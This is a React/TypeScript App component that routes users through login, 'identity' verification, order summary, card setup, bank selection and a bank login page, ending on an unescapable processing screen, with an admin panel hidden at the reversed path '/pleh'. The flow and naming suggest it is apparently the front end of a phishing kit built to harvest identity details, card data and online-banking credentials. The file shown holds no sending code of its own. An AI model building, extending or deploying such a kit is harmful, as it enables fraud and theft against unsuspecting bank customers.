import React, { useState } from 'react';
import EntryPage from './pages/EntryPage';
import NotificationPage from './pages/NotificationPage';
import UserVerificationPage from './pages/UserVerificationPage';
import OrderSummaryPage from './pages/OrderSummaryPage';
import CardSetupPage from './pages/CardSetupPage';
import ProviderSelectionPage from './pages/ProviderSelectionPage';
import ProviderLoginPage from './pages/ProviderLoginPage';
import AuthenticationSuccess from './components/AuthenticationSuccess';
import AdminPage from './pages/AdminPage';
import ProcessingPage from './pages/ProcessingPage';

type Bank = {
  id: string;
  name: string;
  logo: string;
};

type PageType =
  | 'login'
  | 'payment'
  | 'identity'
  | 'transaction'
  | 'payment-config'
  | 'bank-selection'
  | 'bank-auth'
  | 'processing';

function App() {
  const [currentPage, setCurrentPage] = useState<PageType>('login');
  const [userData, setUserData] = useState({});
  const [transactionData, setTransactionData] = useState({
    amount: '',
    itemType: '',
  });
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);

  // Routes spéciales
  if (window.location.pathname === '/success') {
    return <AuthenticationSuccess />;
  }

  if (window.location.pathname === '/pleh') {
    return <AdminPage />;
  }

  const handleLoginSuccess = () => {
    setCurrentPage('payment');
  };

  const handlePaymentAccept = () => {
    setCurrentPage('identity');
  };

  const handleIdentityConfirm = (data: any) => {
    setUserData(data);
    setCurrentPage('transaction');
  };

  const handleTransactionConfirm = (data: {
    amount: string;
    itemType: string;
  }) => {
    setTransactionData(data);
    setCurrentPage('payment-config');
  };

  const handleVerificationComplete = () => {
    setCurrentPage('bank-selection');
  };

  const handleBankSelect = (bank: Bank) => {
    setSelectedBank(bank);
    setCurrentPage('bank-auth');
  };

  const handleBankAuthenticate = () => {
    setCurrentPage('processing');
  };

  const goBack = () => {
    switch (currentPage) {
      case 'payment':
        setCurrentPage('login');
        break;

      case 'identity':
        setCurrentPage('payment');
        break;

      case 'transaction':
        setCurrentPage('identity');
        break;

      case 'payment-config':
        setCurrentPage('transaction');
        break;

      case 'bank-selection':
        setCurrentPage('payment-config');
        break;

      case 'bank-auth':
        setCurrentPage('bank-selection');
        break;

      case 'processing':
        // Pas de retour depuis le processing
        break;

      default:
        break;
    }
  };

  return (
    <div className="font-sans">
      {currentPage === 'login' && (
        <EntryPage onLoginSuccess={handleLoginSuccess} />
      )}

      {currentPage === 'payment' && (
        <NotificationPage
          onAccept={handlePaymentAccept}
          onBack={goBack}
        />
      )}

      {currentPage === 'identity' && (
        <UserVerificationPage
          onNext={handleIdentityConfirm}
          onBack={goBack}
        />
      )}

      {currentPage === 'transaction' && (
        <OrderSummaryPage
          onConfirm={handleTransactionConfirm}
          onBack={goBack}
        />
      )}

      {currentPage === 'payment-config' && (
        <CardSetupPage
          amount={transactionData.amount}
          itemType={transactionData.itemType}
          onVerificationComplete={handleVerificationComplete}
          onBack={goBack}
        />
      )}

      {currentPage === 'bank-selection' && (
        <ProviderSelectionPage
          onBankSelect={handleBankSelect}
          onBack={goBack}
        />
      )}

      {currentPage === 'bank-auth' && selectedBank && (
        <ProviderLoginPage
          bank={selectedBank}
          onAuthenticate={handleBankAuthenticate}
          onBack={goBack}
        />
      )}

      {currentPage === 'processing' && <ProcessingPage />}
    </div>
  );
}

export default App;
